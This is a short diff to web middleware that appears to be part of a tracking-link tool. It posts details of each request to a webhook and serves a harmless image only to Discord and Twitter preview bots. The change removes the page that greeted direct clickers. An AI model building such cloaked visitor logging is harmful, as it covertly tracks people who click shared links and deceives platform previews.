@@ -4,6 +4,7 @@ const webhook = process.env.WEBHOOK_URL // Your webhook URL now is in the .env f
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
+  console.log(ua)
   const source = ["Mozilla/5.0 (compatible; Discordbot/","Twitterbot/"].find(u=>ua?.startsWith(u))
   const page = req.url.split("/").slice(-1)[0]
   await fetch(webhook,{body:JSON.stringify({
@@ -18,9 +19,6 @@ export async function middleware(req){
   if(source){
     // Return the image.
     return NextResponse.rewrite(new URL("/mini.png",req.url))
-  }else{
-    console.log(source);
-    // Make a message for whoever takes the risk to directly click.
-    return NextResponse.rewrite(new URL("/page.html",req.url));
   }
+  NextResponse.next();
 }
